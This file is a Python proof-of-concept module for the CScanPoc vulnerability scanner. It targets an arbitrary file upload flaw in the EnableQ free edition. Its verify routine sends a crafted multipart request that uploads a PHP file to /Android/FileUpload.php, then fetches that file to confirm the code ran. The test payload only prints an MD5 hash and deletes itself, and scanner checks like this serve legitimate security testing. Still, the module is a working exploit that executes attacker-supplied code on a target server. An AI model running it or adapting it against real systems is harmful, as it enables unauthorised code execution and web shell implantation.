# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'EnableQ_0002'  # 平台漏洞编号，留空
    name = 'EnableQ官方免费版任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-07-21'  # 漏洞公布时间
    desc = '''
        EnableQ官方免费版 /Android/FileUpload.php?optionID=1 任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0128219'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EnableQ'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '19a22179-e081-4009-80ac-1666cb8adcf4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Referer http://www.wooyun.org/bugs/wooyun-2010-0128219
            hh = hackhttp.hackhttp()
            raw = """
POST /Android/FileUpload.php?optionID=1 HTTP/1.1
Content-Length: 316
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 UBrowser/5.5.7386.17 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQXp86Nj8hIcFckX4
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=8ff192ee943f84f5047a44d02f4b453e

------WebKitFormBoundaryQXp86Nj8hIcFckX4
Content-Disposition: form-data; name="uploadedfile_1"; filename="xxx.php"
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
------WebKitFormBoundaryQXp86Nj8hIcFckX4
Content-Disposition: form-data; name="button"

提交
------WebKitFormBoundaryQXp86Nj8hIcFckX4--
            """
            url = self.target + '/enableq/Android/FileUpload.php?optionID=1'
            code, head, res, errcode, _ = hh.http(url, raw=raw)
            if code == 200 and 'true|1|' in res:
                File = res.replace('true|1|', 'PerUserData/tmp/')
                url2 = self.target + File
                code, head, res, errcode, _ = hh.http(url2)
                if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
